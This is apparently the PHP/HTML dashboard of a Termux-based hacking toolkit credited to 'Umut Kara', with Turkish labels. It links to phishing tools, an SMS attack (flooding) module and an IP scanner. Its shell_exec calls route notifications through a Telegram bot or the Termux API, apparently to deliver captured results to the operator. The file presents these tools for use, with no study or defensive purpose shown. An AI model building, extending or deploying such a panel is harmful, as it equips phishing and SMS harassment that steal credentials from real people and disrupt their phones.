<!DOCTYPE html>
<html translate="no">
<head>
<link rel="icon" href="http://localhost:4444/phishing-tools/phishing_files/icon.png" type="image/x-icon" />
  <title>WEB İNTERFACE TOOLS</title>
    
<style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  text-shadow: 0px -1px 0px rgba(0,0,0,0.4);
  list-style:none;
  text-decoration: none;
}

body {
  background: #000;
  box-sizing: border-box;
}
a {
  display:block;
  font-family: 'Poppins', sans-serif; 
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.red-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #e50000,
    0 0 40px #e50000,
    0 0 50px #e50000,
    0 0 100px #e50000;
}

.red-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}
.box {
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  background: black;
  border-radius: 15px;
  padding: 100px;
  padding-bottom: 50px;
  box-shadow: 0 0 5px #7CFC00,
              0 0 25px #7CFC00,
              0 0 50px #7CFC00,
	      0 0 200px #7CFC00;
}

.box h1 {
font-size: 50px;
color:white;
text-align: center;
padding: 50px 50px 50px 50px;
margin-top: 40px;
}

h2 {
font-size: 25px;
color: yellow;
text-align: center;
padding: 50px 50px 50px 50px;
margin-top: 40px;
}
.page a{
color: black;
  font-size: 20px;
}

.pages{
  display: none;
}

.page:hover > .pages{
  display: block;
  background: black;
  position: absolute;
  margin-left: -54%;
  border-radius: 15px;
  box-shadow: 0 0 5px #03e9f4,
              0 0 15px #03e9f4,
              0 0 30px #03e9f4,
              0 0 50px #03e9f4;
}

.page:hover{
  background: #03e9f4;
  box-shadow: 0 0 5px #03e9f4,
              0 0 25px #03e9f4,
              0 0 50px #03e9f4,
	      0 0 100px #03e9f4;
}

.page{
  display: block;
  margin:25px 50px;
  padding:10px;
  background: white;
  text-align: center;
  border-radius: 10px;
  margin-bottom: 10px;
  padding: 10px;
}

.pages li {
  padding: 25px;
}

.pages li a{
  color: lime;
  font-size: 20px;
}
.pages li a:hover{
  color: black;
  padding: 10px;
  background: #fff;
  border-radius: 10px;
  box-shadow: 0 0 5px yellow,
              0 0 15px yellow,
              0 0 20px yellow,
	      0 0 30px yellow;
}
.information {
  text-align: center;
  font-size: 30px;
  color: lime;
  padding: 50px 20px;
  border: 1px solid lime;
  border-radius: 10px; 
}
.social-icons {
  text-align: center;
  }  
.social-icons li {
  display:inline-block;
  list-style-type:none;
  -webkit-user-select:none;
  -moz-user-select:none;
  }
.social-icons li a {
  border-bottom: none;
  }
.social-icons li img {
  width:50px;
  height:50px;
  margin-top: 20px;
  margin-right: 20px;
}
</style>

</head>
<body >
<div class="box">
<div class="information"></div>
<a href="/"><h1 class="green-neon"><span class="green-neon" style="font-size: 60px;">W</span>EB <span class="green-neon" style="font-size: 60px;">İ</span>NTERFACE <span class="green-neon" style="font-size: 60px;">T</span>OOLS</h1></a>
<?php
$url = $_SERVER['REQUEST_URI'];
if (strpos($url,"termux-api")){
	shell_exec('bot_umutkaratools 1');
	echo '<h2 class="red-neon">Bildirim Modu Termux Api Seçildi</h2>';
}
if (strpos($url,"telegram-bot")){
	shell_exec('bot_umutkaratools 2');
	echo '<h2 class="red-neon">Bildirim Modu Telegram Bot Seçildi</h2>';
}
?>
<ul class="menu">
   <li class="page"><a href="/phishing-tools/phishing-tools.php">PHİSHİNG&nbsp;TOOLS</a></li>
   <li class="page"><a href="/sms-attack/interface/index.php">SMS&nbsp;ATTACK</a></li>
   <li class="page"><a href="ip-scan/index.php">İP&nbsp;SCAN</a><!--
     <ul class="pages">
         <li><a href="#">Hacking&nbsp;Attack</a></li>
     </ul>--></li>

   <li class="page"><a href="#">BİLDİRİM&nbsp;MODLARI</a>
     <ul class="pages">
     <li><h3 style="color: yellow; font-size:15px;">[✓] <?php $notification = shell_exec('cat $PREFIX/lib/.bot_config |sed -n 2p'); echo $notification ?></h3></li>
         <li><a href="?telegram-bot">TELEGRAM&nbsp;BOT</a></li>
	 <li><?php if (file_exists("/data/data/com.termux/files/usr/lib/.successful")){ echo '<a href="?termux-api">TERMUX&nbsp;APİ</a>';} else { echo '<a href="#" style="color: red;">TERMUX APİ KURULU DEĞİL</a>';} ?></li>
     </ul>
</li>

   <li class="page"><a href="/phishing-tools/phishing_files/logout.php" style="color: #DB0000;">ÇIKIŞ&nbsp;YAP</a></li>
</ul>

<ul class="social-icons">
    <li><a href="https://www.t.me/umutkaratools"><img src='phishing-tools/phishing_files/telegram.png' alt="Telegram"/></a></li>
    <li><a href="https://www.instagram.com/umutkaratools"><img src='phishing-tools/phishing_files/instagram.png' alt="İnstagram"/></a></li>
    <li><a href="https://youtube.com/channel/UCE3QvczZXklHSAaRFwDLP5g"><img src='phishing-tools/phishing_files/youtube.png' alt="Youtube"/></a></li>
</ul>
</div>
 
 <script>

(function(){
  var element=document.getElementsByTagName('p');
setInterval(function(){
    if((element[0].clientWidth)==380) {
      element[1].classList.add('f1');
    }
  
}, 1000)
}());
}

</script>

 <script>
const text = [`
	+-+-+-+-+-+-+-+-+-+-+-+

	  CoDeD By UmuT KaRa
	
	+-+-+-+-+-+-+-+-+-+-+-+`]
let line = 0
let index = 0
let out = ''
let outHtml = document.querySelector('.information')

function typeLine() {
  let interval = setTimeout(() => {
    out += text[line][index]
    outHtml.innerHTML = out + ' |'
    index++
    if(index >= text[line].length){
      index = 0
      line++
      if(line == text.length){
        clearTimeout(interval)
        outHtml.innerHTML = out
        return true
      }
    }
    typeLine()
  }, getRandomInt(getRandomInt(250*2)))
}
typeLine()
function getRandomInt(max){
  return Math.floor(Math.random() * Math.floor(max))
}
</script>
</body>

</html>
